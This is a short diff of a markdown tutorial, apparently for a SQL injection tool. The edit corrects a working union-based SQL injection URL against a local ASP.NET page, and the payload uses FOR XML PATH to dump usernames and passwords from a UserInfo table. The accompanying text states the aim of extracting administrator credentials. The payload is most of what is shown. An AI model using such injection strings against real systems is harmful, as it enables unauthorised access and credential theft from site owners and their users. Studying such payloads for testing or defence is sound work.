@@ -63,7 +63,7 @@ Now we see UserInfo, username and Password.
 
 For this situation i want to extract Administration credential form this columns
 ```sql
-http://localhost/Category-Product.aspx?id=-6&' union select 1,(select User_Name,Password from UserInfo FOR XML PATH('')),3-- -
+http://localhost/Category-Product.aspx?id=-6' union select 1,(select User_Name,Password from UserInfo FOR XML PATH('')),3-- -
 ```
 ![Screenshot from 2024-01-25 11-16-25](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/abf6e991-823d-42c7-a440-4c6b81441939)
 ```plaintext
